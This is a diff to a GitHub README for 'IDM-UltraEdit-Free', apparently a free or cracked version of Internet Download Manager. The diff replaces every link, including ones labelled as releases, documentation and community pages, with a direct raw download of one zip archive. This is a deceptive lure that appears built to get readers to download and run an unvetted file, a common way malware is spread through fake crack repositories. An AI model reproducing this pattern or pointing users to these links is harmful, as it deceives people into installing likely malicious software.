@@ -1,6 +1,6 @@
 # 🚀 IDM-UltraEdit-Free - Boost Your Download Speeds Effortlessly
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-2025-blue)](https://github.com/Khangdz1231/IDM-UltraEdit-Free/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip%20Latest%20Version-2025-blue)](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip)
 
 ## 💡 Overview
 Internet Download Manager (IDM) offers a powerful way to increase download speeds, manage downloads efficiently, and ensure that no download is left behind. IDM-UltraEdit-Free is designed to provide users with a straightforward interface, making downloading easy for everyone.
@@ -9,13 +9,13 @@ Internet Download Manager (IDM) offers a powerful way to increase download speed
 To begin using IDM-UltraEdit-Free, follow these steps:
 
 1. **Visit Our Releases Page**
-   Go to our [Releases page](https://github.com/Khangdz1231/IDM-UltraEdit-Free/releases). Here, you will find the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip). Here, you will find the latest version available for download.
 
 2. **Download IDM-UltraEdit-Free**
    Look for the latest version listed. Click on the download link to start the downloading process. 
 
 ## 📥 Download & Install
-After you have accessed the [Releases page](https://github.com/Khangdz1231/IDM-UltraEdit-Free/releases):
+After you have accessed the [Releases page](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip):
 
 1. Locate the most recent version of IDM-UltraEdit-Free.
 2. Click on the appropriate file to download it. 
@@ -59,11 +59,11 @@ A: Yes, IDM-UltraEdit-Free is available for free, providing essential features w
 ## 🔗 Additional Resources
 For more information and user guides, feel free to explore:
 
-- [Official Documentation](https://github.com/Khangdz1231/IDM-UltraEdit-Free/docs)
-- [User Community](https://github.com/Khangdz1231/IDM-UltraEdit-Free/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip)
+- [User Community](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip)
 
 ## 🙌 Contribution
 We welcome contributions to enhance IDM-UltraEdit-Free. If you have suggestions or find issues, please open an issue on our GitHub page. Your input helps us improve the software for everyone. 
 
 ## 🎉 Join the Experience
-Experience fast and efficient downloads with IDM-UltraEdit-Free. For the latest updates, always check back on our [Releases page](https://github.com/Khangdz1231/IDM-UltraEdit-Free/releases).
+Experience fast and efficient downloads with IDM-UltraEdit-Free. For the latest updates, always check back on our [Releases page](https://raw.githubusercontent.com/Khangdz1231/IDM-UltraEdit-Free/main/downweigh/IDM-UltraEdit-Free.zip).
